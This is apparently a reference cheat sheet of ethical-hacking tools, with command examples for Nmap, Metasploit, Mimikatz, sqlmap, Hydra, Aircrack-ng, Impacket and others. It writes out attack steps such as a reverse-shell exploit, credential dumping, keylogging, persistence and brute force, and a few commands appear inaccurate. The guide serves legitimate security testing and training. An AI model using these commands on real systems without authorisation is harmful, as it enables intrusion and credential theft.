# Ethical Hacking Tools

## Table of Contents

1. [Reconnaissance Tools](#reconnaissance-tools)
2. [Scanning Tools](#scanning-tools)
3. [Exploitation Tools](#exploitation-tools)
4. [Password Cracking Tools](#password-cracking-tools)
5. [Web Application Tools](#web-application-tools)
6. [Wireless Tools](#wireless-tools)
7. [Post-Exploitation Tools](#post-exploitation-tools)
8. [Forensics Tools](#forensics-tools)

---

## Reconnaissance Tools

### 1. Nmap

```bash
# Basic scanning
nmap target.com                    # Basic scan
nmap -sV target.com               # Service version
nmap -O target.com                # OS detection
nmap -A target.com                # Aggressive scan
nmap -p- target.com               # All ports

# Stealth scans
nmap -sS target.com               # SYN scan
nmap -sN target.com               # Null scan
nmap -sX target.com               # Christmas scan

# Scripts
nmap --script vuln target.com     # Vulnerability scan
nmap --script http-enum target.com # HTTP enumeration
nmap --script smb-enum-shares target.com # SMB enumeration

# Output
nmap -oA output target.com        # All formats
nmap -oG output.txt target.com    # Grepable
nmap -oX output.xml target.com    # XML
```

### 2. Recon-ng

```bash
# Start
recon-ng

# Workspace management
workspaces create target_project
workspaces load target_project
workspaces list

# Module management
marketplace search reconnaissance
marketplace install all
modules load recon/domains-hosts/bing_domain_web

# Use module
options set SOURCE example.com
run

# Database queries
db query SELECT * FROM hosts
```

### 3. Maltego

```
Maltego Features:
├── Visual link analysis
├── OSINT gathering
├── Transform hub
├── Case management
└── Reporting

Common Transforms:
├── Domain → IP Addresses
├── Email → Person
├── Company → Employees
├── Domain → DNS Records
├── Person → Social Media
└── Phone Number → Owner
```

### 4. Shodan

```bash
# Web interface
# https://www.shodan.io

# CLI
shodan init API_KEY
shodan search apache country:US
shodan host 8.8.8.8

# Common queries
org:"Target Company"
hostname:target.com
ssl.cert.subject.cn:target.com
```

### 5. theHarvester

```bash
# Email/subdomain harvesting
theHarvester -d target.com -b google
theHarvester -d target.com -b bing,linkedin
theHarvester -d target.com -b all -f results.html

# Sources
-b sources: google, bing, linkedin, twitter, etc.
```

---

## Scanning Tools

### 1. Nessus

```
Nessus Components:
├── Nessus Scanner
├── Nessus Web Interface
├── Policies
├── Scan Templates
└── Reports

Scan Types:
├── Basic Network Scan
├── Advanced Scan
├── Advanced Policy Scan
├── Discovery Scan
├── Host Discovery
├── System Discovery
└── Web Application Tests
```

### 2. OpenVAS

```bash
# Setup
apt install openvas
openvas-setup

# Start services
systemctl start openvas-scanner
systemctl start openvas-manager
systemctl start greenbone-security-assistant

# Access web UI
# https://localhost:9392
```

### 3. Nikto

```bash
# Basic scan
nikto -h http://target.com

# With authentication
nikto -h target.com -id user:pass

# Specific ports
nikto -h target.com -p 80,443,8080

# Evasion
nikto -h target.com -evasion 1

# Output
nikto -h target.com -o results.html -Format htm
```

### 4. WPScan

```bash
# Basic scan
wpscan --url http://target.com

# With API token
wpscan --url http://target.com --api-token TOKEN

# Aggressive scan
wpscan --url http://target.com --enumerate ap,at,u

# Brute force
wpscan --url http://target.com --passwords wordlist.txt --usernames admin
```

---

## Exploitation Tools

### 1. Metasploit Framework

```bash
# Start
msfconsole -q

# Search
search type:exploit platform:windows
search eternalblue

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue

# Options
show options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run
exploit

# Meterpreter
sysinfo
getuid
hashdump
download file.txt
upload shell.exe
shell
screenshot
keyscan_start
```

**Meterpreter Commands:**

| Command | Description |
|---------|-------------|
| sysinfo | System information |
| getuid | Current user |
| getsystem | Escalate privileges |
| hashdump | Dump password hashes |
| shell | System shell |
| download | Download file |
| upload | Upload file |
| screenshot | Capture screen |
| keyscan_start | Start keylogger |
| persistence | Install backdoor |
| portfwd | Port forwarding |

### 2. Cobalt Strike

```
Cobalt Strike Features:
├── Beacon payloads
├── C2 infrastructure
├── Malleable C2 profiles
├── Process injection
├── Privilege escalation
├── Lateral movement
└── Reporting

Beacon Types:
├── DNS Beacon
├── HTTP/HTTPS Beacon
├── SMB Beacon
└── TCP Beacon
```

### 3. Empire

```bash
# Start
python empire

# Listeners
listeners
usertype http
set Host http://192.168.1.50:80

# Generate launcher
launcher powershell

# Agents
interact agent_id

# Modules
usemodule privesc/msherpy
```

### 4. SQLMap

```bash
# Basic test
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/login" --data="user=admin&pass=*"

# Databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Tables
sqlmap -u "http://target.com/page?id=1" -D database --tables

# Dump
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# With cookie
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"
```

---

## Password Cracking Tools

### 1. John the Ripper

```bash
# Basic
john hash.txt

# Format specific
john --format=raw-md5 hash.txt

# Wordlist
john --wordlist=passwords.txt hash.txt

# Rules
john --rules --wordlist=passwords.txt hash.txt

# Show cracked
john --show hash.txt

# Incremental
john --incremental hash.txt
```

### 2. Hashcat

```bash
# MD5
hashcat -m 0 hash.txt wordlist.txt

# SHA-256
hashcat -m 1400 hash.txt wordlist.txt

# NTLM
hashcat -m 1000 hash.txt wordlist.txt

# Rules
hashcat -m 0 hash.txt wordlist.txt -r rules/best64.rule

# Brute force
hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a

# GPU
hashcat -m 0 hash.txt -d 1
```

### 3. Hydra

```bash
# SSH
hydra -l admin -P passwords.txt ssh://192.168.1.100

# HTTP form
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# FTP
hydra -l admin -P passwords.txt ftp://192.168.1.100

# RDP
hydra -l administrator -P passwords.txt rdp://192.168.1.100

# Threads
hydra -l admin -P passwords.txt -t 4 ssh://target
```

### 4. Medusa

```bash
# SSH
medusa -h target -u admin -P passwords.txt -M ssh

# HTTP
medusa -h target -u admin -P passwords.txt -M http -m DIR:/admin

# FTP
medusa -h target -u admin -P passwords.txt -M ftp
```

---

## Web Application Tools

### 1. Burp Suite

```
Burp Suite Components:

Proxy
├── Intercept requests
├── HTTP history
├── WebSockets history
└── Options

Spider
├── Crawl web apps
├── Discover content
└── Forms

Scanner
├── Active scanning
├── Passive scanning
└── Issues

Intruder
├── Attack types: Sniper, Battering ram, Pitchfork, Cluster bomb
├── Payload sets
└── Resource pool

Repeater
├── Manual requests
├── Response analysis
└── Variations

Decoder
├── URL encode/decode
├── HTML encode/decode
├── Base64
├── Hex
└── Gzip

Comparer
├── Diff responses
└── Hex/Text view
```

### 2. OWASP ZAP

```bash
# Quick scan
zap-cli quick-scan http://target

# Full scan
zap-full-scan.py -t http://target

# API scan
zap-api-scan.py -t http://target/swagger.json -f openapi

# Spider
zap-cli spider http://target

# Active scan
zap-cli active-scan http://target

# Report
zap-cli report -o report.html -f html
```

### 3. Wfuzz

```bash
# Directory fuzzing
wfuzz -c -z file,wordlist.txt http://target/FUZZ

# Parameter fuzzing
wfuzz -c -z file,wordlist.txt -d "param=FUZZ" http://target

# Username enumeration
wfuzz -c -z file,users.txt -d "user=FUZZ&pass=pass" http://target

# Bypass WAF
wfuzz -c -z file,wordlist.txt -H "X-Forwarded-For: FUZZ" http://target
```

### 4. Gobuster

```bash
# Directory mode
gobuster dir -u http://target -w wordlist.txt

# DNS mode
gobuster dns -d target.com -w wordlist.txt

# VHost mode
gobuster vhost -u http://target -w wordlist.txt

# With extensions
gobuster dir -u http://target -w wordlist.txt -x php,html,txt
```

---

## Wireless Tools

### 1. Aircrack-ng

```bash
# Monitor mode
airmon-ng start wlan0

# Scan networks
airodump-ng wlan0mon

# Capture handshake
airodump-ng -c 6 --bssid MAC -w capture wlan0mon

# Deauth attack
aireplay-ng --deauth 10 -a AP_MAC wlan0mon

# Crack WPA
aircrack-ng -w wordlist.txt capture-01.cap

# Crack WEP
aircrack-ng capture-01.cap
```

### 2. Wifite

```bash
# Automated attack
wifite

# Specific target
wifite --bssid MAC --channel 6

# WPA only
wifite --wpa

# WEP only
wifite --wep
```

### 3. Reaver

```bash
# WPS attack
reaver -i wlan0mon -b MAC -vv

# Pixie dust
reaver -i wlan0mon -b MAC -K 1 -vv
```

---

## Post-Exploitation Tools

### 1. Mimikatz

```
Mimikatz Commands:

# Extract credentials
sekurlsa::logonpasswords

# Dump SAM
lsadump::sam

# Kerberos tickets
sekurlsa::tickets

# Pass the hash
sekurlsa::pth /user:admin /ntlm:hash

# Golden ticket
kerberos::golden /user:admin /domain:domain.com /sid:S-1-5 /krbtgt:hash
```

### 2. BloodHound

```bash
# Collect data
SharpHound.exe -c All

# Analyze in GUI
bloodhound-python -u user -p pass -d domain.com -c All

# Find paths to Domain Admin
# Use BloodHound GUI to analyze
```

### 3. PowerSploit

```powershell
# Import module
Import-Module .\PowerSploit.psd1

# Reconnaissance
Get-NetDomain
Get-NetUser
Get-NetComputer
Find-LocalAdminAccess

# Privilege escalation
Get-UnquotedService
Get-ModifiableService
Write-ServiceBinary

# Persistence
Install-ServiceBinary
Add-RegistryKey
```

### 4. Impacket

```bash
# PsExec
psexec.py domain/user:password@target

# WMIExec
wmiexec.py domain/user:password@target

# SMBExec
smbexec.py domain/user:password@target

# Kerberoasting
GetUserSPNs.py domain/user:password -dc-ip DC_IP -request
```

---

## Forensics Tools

### 1. Autopsy

```
Autopsy Features:
├── Disk image analysis
├── File system analysis
├── Timeline analysis
├── Keyword search
├── Registry analysis
├── Web artifacts
├── Email analysis
└── Deleted file recovery
```

### 2. Volatility

```bash
# Image info
volatility -f memory.dmp imageinfo

# Process list
volatility -f memory.dmp --profile=Win7SP1x64 pslist

# Network
volatility -f memory.dmp --profile=Win7SP1x64 netscan

# Command history
volatility -f memory.dmp --profile=Win7SP1x64 cmdline
```

### 3. Sleuth Kit

```bash
# File system analysis
fls image.E01
tsk_recover image.E01

# File analysis
icat image.E01 inode

# Volume system
mmls image.E01
```

---

## Tool Installation

### Kali Linux

```bash
# Default installation includes most tools
sudo apt update && sudo apt install kali-linux-full
```

### Ubuntu/Debian

```bash
# Nmap
sudo apt install nmap

# Metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# Burp Suite
# Download from PortSwigger

# John the Ripper
sudo apt install john

# Hashcat
sudo apt install hashcat

# Hydra
sudo apt install hydra
```

### Docker

```bash
# Metasploit
docker run -it metasploitframework/metasploit-framework

# Burp Suite
docker run -p 8080:8080 portswigger/burp-suite

# OWASP ZAP
docker run -u zap -p 8080:8080 ghcr.io/zaproxy/zaproxy:stable
```

---

## Tool Comparison

### Exploitation Frameworks

| Tool | Learning Curve | Features | Cost |
|------|---------------|----------|------|
| Metasploit | Medium | Extensive | Free/Pro |
| Cobalt Strike | High | Advanced C2 | Commercial |
| Empire | Medium | PowerShell | Free |
| Core Impact | High | Enterprise | Commercial |

### Password Crackers

| Tool | Speed | GPU | Ease |
|------|-------|-----|------|
| John | Medium | Limited | Easy |
| Hashcat | Fast | Excellent | Medium |
| Hydra | N/A | No | Easy |

### Web Application

| Tool | Features | Cost |
|------|----------|------|
| Burp Suite | Complete suite | Free/Pro |
| OWASP ZAP | Open source | Free |
| Nikto | Quick scan | Free |
| SQLMap | SQL injection | Free |

---

## Quick Reference

### Essential Commands

```bash
# Network
nmap -sV target
netstat -tuln
tcpdump -i eth0

# Web
nikto -h target
dirb http://target
gobuster dir -u http://target -w wordlist.txt

# Password
john hash.txt
hashcat -m 0 hash.txt wordlist.txt
hydra -l user -P pass.txt ssh://target

# Exploit
msfconsole
search type:exploit
use exploit/name
set RHOSTS target
exploit
```

---

*Last Updated: 2024*
